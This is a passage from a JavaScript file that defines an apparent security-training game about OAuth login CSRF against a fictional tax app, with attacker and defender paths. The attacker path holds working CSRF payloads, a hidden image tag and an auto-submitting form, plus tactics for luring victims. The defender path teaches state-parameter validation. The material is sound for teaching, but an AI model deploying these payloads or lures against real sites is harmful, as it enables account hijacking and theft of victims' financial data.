          narrative: "You create a page with a hidden image tag:",
          codeSnippet: `<html><body>
  <h1>Cute Cat Pictures!</h1>
  <!-- Hidden CSRF -->
  <img src="https://taxapp.com/callback?code=ATTACKER_CODE"
       style="display:none">
  <img src="cat.jpg">
</body></html>`,
          observation: "When victims load this, their browser requests the callback with YOUR code!",
          choices: [
            { id: 'deploy', text: 'Deploy the attack page', riskDelta: 10, successDelta: 15, next: 'deploy_attack' }
          ]
        },

        create_csrf: {
          id: 'create_csrf',
          title: 'Creating the CSRF Page',
          narrative: "You create an auto-submitting form:",
          codeSnippet: `<html>
<body onload="document.forms[0].submit()">
  <form method="GET" action="https://taxapp.com/callback">
    <input type="hidden" name="code" value="ATTACKER_CODE">
  </form>
  <p>Please wait...</p>
</body>
</html>`,
          observation: "Victims visiting this will complete YOUR OAuth flow!",
          choices: [
            { id: 'deploy', text: 'Deploy and lure victims', riskDelta: 15, successDelta: 20, next: 'deploy_attack' }
          ]
        },

        deploy_attack: {
          id: 'deploy_attack',
          title: 'Deploying the Attack',
          narrative: "Get victims to visit your page while logged into the tax app:",
          choices: [
            { id: 'email', text: 'Email link disguised as tax info', riskDelta: 20, successDelta: 25, consequence: "Targeted, might be filtered", next: 'execute_attack' },
            { id: 'forum', text: 'Post on tax preparation forums', riskDelta: 15, successDelta: 20, consequence: "Reaches interested users", next: 'execute_attack' },
            { id: 'ads', text: 'Buy ads targeting tax users', riskDelta: 25, successDelta: 30, consequence: "Wide reach but evidence trail", next: 'ad_detected' }
          ]
        },

        ad_detected: {
          id: 'ad_detected',
          title: 'Ads Rejected',
          isFailure: true,
          failureType: 'detected',
          narrative: "The ad network detected your malicious landing page!",
          codeSnippet: `Google Ads Policy Violation:
- Malicious redirect detected
- Auto-form submission detected
- Account suspended`,
          learningMoment: {
            title: "Ad Network Security",
            explanation: "Major ad networks scan landing pages for malicious behavior including auto-redirects and CSRF attempts.",
            recommendation: "Direct social engineering often works better for CSRF attacks."
          },
          choices: [
            { id: 'retry', text: 'Use forum posting instead', next: 'execute_attack', riskDelta: 10, successDelta: -10 }
          ]
        },

        execute_attack: {
          id: 'execute_attack',
          title: 'Executing the Attack',
          narrative: "A victim clicks your link while logged into the tax app...",
          configCheck: 'requireStateParam',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The application rejects the callback:",
            codeSnippet: `Error: CSRF Detected

State parameter mismatch.
Session state: (none)
Callback state: (none)

This appears to be a CSRF attempt.`,
            explanation: "The app uses state parameter validation! Since the victim never initiated this flow, there's no matching state in their session.",
            endingType: 'blocked'
          },
          onVulnerable: {
            title: 'Attack Succeeded!',
            narrative: "The app accepts the callback and logs the victim into YOUR account!",
            codeSnippet: `// Victim's browser:
Welcome to TaxPrep Pro!
Connected: attacker@evil.com  <- YOUR account!

// Victim enters:
- Social Security Number
- Bank account details
- Income information

// All saved to YOUR account!`,
            explanation: "Without state validation, the app can't tell if the callback was initiated by the victim or an attacker. The victim is using YOUR account, and their sensitive data belongs to you!",
            endingType: 'success'
          }
        }
      }
    },

    defender: {
      intro: "Users report their tax data appearing in accounts they don't recognize. Your security team suspects a CSRF vulnerability in the OAuth callback...",
      goal: "Implement state parameter validation to prevent CSRF attacks on the OAuth callback.",
      initialRisk: 0,
      initialSuccess: 100,

      steps: {
        start: {
          id: 'start',
          title: 'Analyzing the Issue',
          narrative: "You examine the OAuth callback handler:",
          codeSnippet: `// Current callback:
app.get('/callback', async (req, res) => {
  const code = req.query.code;
  const tokens = await exchangeCode(code);
  req.session.user = tokens.user;
  res.redirect('/dashboard');
  // NO STATE VALIDATION!
});`,
          observation: "The callback doesn't verify the OAuth flow was initiated by this user!",
          showControls: ['requireStateParam'],
          choices: [
            { id: 'implement', text: 'Implement state parameter validation', riskDelta: 0, successDelta: 30, next: 'implement_state' },
            { id: 'research', text: 'Research CSRF protection best practices', riskDelta: 0, successDelta: 15, next: 'research' }
          ]
        },

        research: {
          id: 'research',
          title: 'CSRF Protection Research',
          narrative: "You study OAuth 2.0 security recommendations:",
          codeSnippet: `RFC 6749 Section 10.12:
"The client MUST implement CSRF protection for its
redirection URI... typically accomplished by including
a value that binds the request to the user-agent's
authenticated state (e.g., hash of session cookie)"

Best practice: Unpredictable 'state' parameter`,
          choices: [
            { id: 'implement', text: 'Implement the state parameter', riskDelta: 0, successDelta: 25, next: 'implement_state' }
          ]
        },

        implement_state: {
          id: 'implement_state',
          title: 'Implementing State Validation',
          narrative: "Generate and validate a state parameter:",
          instruction: "Enable 'Require State Parameter' to enforce CSRF protection.",
          showControls: ['requireStateParam'],
          codeSnippet: `// Updated implementation:

// 1. Generate state before redirect:
app.get('/login', (req, res) => {
  const state = crypto.randomBytes(32).toString('hex');
  req.session.oauthState = state;
  const authUrl = \`/authorize?...&state=\${state}\`;
  res.redirect(authUrl);
});

// 2. Validate in callback:
app.get('/callback', (req, res) => {
  if (req.query.state !== req.session.oauthState) {
    return res.status(403).send('CSRF detected');
  }
  // proceed...
});`,
          configCheck: 'requireStateParam',
          onSecure: {
            title: 'State Validation Enabled',
            narrative: "Your OAuth flow is now protected against CSRF:",
            codeSnippet: `// Attack attempt:
Attacker's page -> Victim -> /callback?code=ATTACKER_CODE

Session state: "7a8b9c..." (from victim's flow)
Callback state: undefined  (attacker didn't set one)

Result: REJECTED - State mismatch`,
            explanation: "The state parameter is cryptographically random and bound to the user's session. Attackers cannot guess or forge it!",
            endingType: 'success'
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "Without state validation, CSRF attacks remain possible.",
            instruction: "Enable state validation to secure your OAuth flow.",
            continueDisabled: true
          }
        }
      }
    }
  }
];

// Ending type definitions
const ENDING_TYPES = {
  success: { icon: '🏆', title: 'Complete Success', description: 'Attack succeeded - target compromised' },
  partial: { icon: '⚠️', title: 'Partial Success', description: 'Attack worked but triggered alerts' },
  blocked: { icon: '🔒', title: 'Blocked', description: 'Security controls prevented the attack' },
  detected: { icon: '🚨', title: 'Detected', description: 'Attack was caught - evidence left' }
};

// Helper functions
function getScenarioById(id) {
  return STORY_SCENARIOS.find(s => s.id === id);
}

function getDifficultyClass(difficulty) {
  const classes = { beginner: 'badge-success', intermediate: 'badge-warning', advanced: 'badge-error' };
  return classes[difficulty] || 'badge-info';
}

function getEndingInfo(type) {
  return ENDING_TYPES[type] || ENDING_TYPES.blocked;
}

// Export
if (typeof window !== 'undefined') {
  window.STORY_SCENARIOS = STORY_SCENARIOS;
  window.ENDING_TYPES = ENDING_TYPES;
  window.getScenarioById = getScenarioById;
  window.getDifficultyClass = getDifficultyClass;
  window.getEndingInfo = getEndingInfo;
}
